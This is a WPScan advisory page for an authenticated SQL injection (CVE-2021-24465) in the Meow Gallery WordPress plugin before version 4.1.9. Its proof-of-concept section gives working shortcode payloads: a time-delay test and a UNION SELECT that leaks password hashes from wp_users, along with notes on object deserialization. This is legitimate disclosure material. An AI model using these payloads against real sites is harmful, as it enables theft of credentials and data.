=== Content from wpscan.com_274f2f4a_20250115_082430.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Meow Gallery < 4.1.9 - Contributor+ SQL Injection

### Description

The plugin does not sanitise, validate or escape the ids attribute of its gallery shortcode (available for users as low as Contributor) before using it in an SQL statement, leading to an authenticated SQL Injection issue. The injection also allows the returned values to be manipulated in a way that could lead to data disclosure and arbitrary objects to be deserialized.

### Proof of Concept

Simple PoC to prove the SQLi: add the following shortcode in a page/post with a role as low as contributor, then preview/view it and note the 10s delay
[gallery layout="cascade" ids="1) AND (select\*from(select(sleep(10)))a"]
-- Reporter PoC:
This SQL injection allows two things: 1) disclosure of arbitrary contents in SQL tables, and 2) deserialization of arbitrary objects.
To prepare for data disclosure, we first need to get serialized version of \_wp\_attachment\_metadata. Of course if you are here for deserialization this can be replaced with serialization gadgets.
This is the JSON I used for this:
{"width":1,"height":1,"file":"a.png","sizes":{"medium":{"file":"a.png","width":1,"height":1,"mime-type":"image/png"},"thumbnail":{"file":"a.png","width":1,"height":1,"mime-type":"image/png"}},"image\_meta":{"aperture":"0","credit":"","camera":"","caption":"","created\_timestamp":"0","copyright":"","focal\_length":"0","iso":"0","shutter\_speed":"0","title":"","orientation":"0","keywords":[]}}
b64 = eyJ3aWR0aCI6MSwiaGVpZ2h0IjoxLCJmaWxlIjoiYS5wbmciLCJzaXplcyI6eyJtZWRpdW0iOnsiZmlsZSI6ImEucG5nIiwid2lkdGgiOjEsImhlaWdodCI6MSwibWltZS10eXBlIjoiaW1hZ2UvcG5nIn0sInRodW1ibmFpbCI6eyJmaWxlIjoiYS5wbmciLCJ3aWR0aCI6MSwiaGVpZ2h0IjoxLCJtaW1lLXR5cGUiOiJpbWFnZS9wbmcifX0sImltYWdlX21ldGEiOnsiYXBlcnR1cmUiOiIwIiwiY3JlZGl0IjoiIiwiY2FtZXJhIjoiIiwiY2FwdGlvbiI6IiIsImNyZWF0ZWRfdGltZXN0YW1wIjoiMCIsImNvcHlyaWdodCI6IiIsImZvY2FsX2xlbmd0aCI6IjAiLCJpc28iOiIwIiwic2h1dHRlcl9zcGVlZCI6IjAiLCJ0aXRsZSI6IiIsIm9yaWVudGF0aW9uIjoiMCIsImtleXdvcmRzIjpbXX19
Which can be base64\_encode(serialize(json\_decode(PAYLOAD))) ed to get the serialized payload.
Shortcode payload for leaking user's password hashes:
[gallery layout="cascade" ids="1) UNION SELECT id,user\_pass,FROM\_BASE64('BASE64ED\_PAYLOAD\_SEE\_ABOVE') FROM wp\_users WHERE id IN (1,2,3,4"]
This should produce a HTML like (base64ed):
<div class="mgl-row mgl-layout-1-o" data-cascade-layout="o"><div class="mgl-box a"><figure class="mgl-item">
<div class="mgl-icon">
<div class="mgl-img-container">
</div>
</div>
<figcaption class="mgl-caption">
<p>LEAKED PASSWORD HASH/</p>
</figcaption>
</figure>
</div></div>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

meow-gallery](https://a8cteam5105.wordpress.com/plugin/meow-gallery/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.1.9

### References

CVE
[CVE-2021-24465](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24465)

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[7.7 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
apple502j

Submitter
apple502j

Verified
Yes

WPVDB ID
[08dbe202-0136-4502-87e7-5e984dc27b16](https://a8cteam5105.wordpress.com/vulnerability/08dbe202-0136-4502-87e7-5e984dc27b16/)

### Timeline

Publicly Published
2021-09-02 (about 3 years ago)

Added
2021-09-02 (about 3 years ago)

Last Updated
2022-04-08 (about 2 years ago)

### Other

Published
Title

Published
2023-10-30
Title
[WP fade in text news < 12.1 - Authenticated (Subscriber+) SQL Injection via Shortcode](https://a8cteam5105.wordpress.com/vulnerability/8ad84318-d146-4a0a-9117-9873880667a2/)

Published
2024-05-31
Title
[wpDataTables - Tables & Table Charts (Premium) < 6.3.2 - Unauthenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/ca8fdae7-b5c1-405e-a741-f94632ec81a9/)

Published
2023-11-23
Title
[WC Vendors Marketplace < 2.4.7.1 - Authenticated (Shop manager+) SQL Injection via search dates](https://a8cteam5105.wordpress.com/vulnerability/f653426a-fb64-4070-b494-9c6e87a87724/)

Published
2015-07-07
Title
[Pinpoint Booking System <= 2.0 - Authenticated Blind SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/2dffadda-6452-400f-93a0-6e91ab642614/)

Published
2014-08-01
Title
[myftp-ftp-like-plugin-for-wordpress v2 - SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/2415caba-2f25-42f0-8428-aec68f73b4ea/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

